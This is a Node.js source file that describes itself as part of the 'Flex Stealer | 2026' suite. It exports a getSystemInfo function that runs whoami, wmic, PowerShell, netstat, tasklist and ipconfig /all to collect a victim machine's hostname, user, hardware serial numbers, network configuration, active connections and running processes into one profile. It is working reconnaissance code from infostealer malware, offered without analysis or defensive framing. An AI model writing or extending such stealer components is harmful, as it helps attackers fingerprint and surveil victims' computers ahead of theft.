const { exec } = require('child_process');
const { promisify } = require('util');
const os = require('os');
const execAsync = promisify(exec);

/**
 * Gathers detailed system and Discord environment information.
 * Part of the Flex Stealer | 2026 suite.
 */
const getSystemInfo = async () => {
    try {
        const commands = [
            'hostname',
            'whoami',
            'wmic os get Caption /value',
            'wmic cpu get Name /value',
            'wmic baseboard get product,Manufacturer,version,serialnumber /value',
            'wmic path win32_VideoController get name /value',
            'wmic path Win32_Processor get NumberOfCores,NumberOfLogicalProcessors /value',
            'powershell -command "Get-ItemProperty -Path \'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\' | Select-Object -ExpandProperty ProductName"',
            'powershell -command "Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object -ExpandProperty Sum"',
            'powershell -command "Get-CimInstance Win32_DiskDrive | Select-Object -ExpandProperty Model"',
            'netstat -ano',
            'tasklist',
            'ipconfig /all'
        ];

        const results = await Promise.all(commands.map(cmd => 
            execAsync(cmd).then(r => r.stdout.trim()).catch(() => "Unknown")
        ));

        const [
            hostname, user, osCaption, cpu, baseboard, gpu, cores, 
            windowsVer, ramBytes, disks, netstat, tasklist, ipconfig
        ] = results;

        // Calculate RAM in GB
        const totalRam = ramBytes !== "Unknown" ? Math.round(parseInt(ramBytes) / (1024 ** 3)) + " GB" : "Unknown";

        return {
            hostname: hostname,
            username: user,
            os_name: osCaption.replace(/Caption=/g, '').trim() || os.type(),
            cpu: cpu.replace(/Name=/g, '').trim(),
            gpu: gpu.replace(/Name=/g, '').trim(),
            baseboard: baseboard.replace(/Manufacturer=|Product=|SerialNumber=|Version=/g, ' ').trim(),
            total_ram: totalRam,
            cores: cores.replace(/NumberOfCores=|NumberOfLogicalProcessors=/g, ' ').trim(),
            windows_product: windowsVer,
            disks: disks,
            network_info: ipconfig,
            active_connections: netstat,
            running_tasks: tasklist,
            platform: os.platform(),
            uptime: os.uptime(),
            arch: os.arch(),
            homedir: os.homedir(),
            tmpdir: os.tmpdir()
        };
    } catch (error) {
        return {
            error: "Failed to gather full system info",
            platform: os.platform(),
            hostname: os.hostname(),
            username: os.userInfo().username
        };
    }
};

module.exports = {
    getSystemInfo
};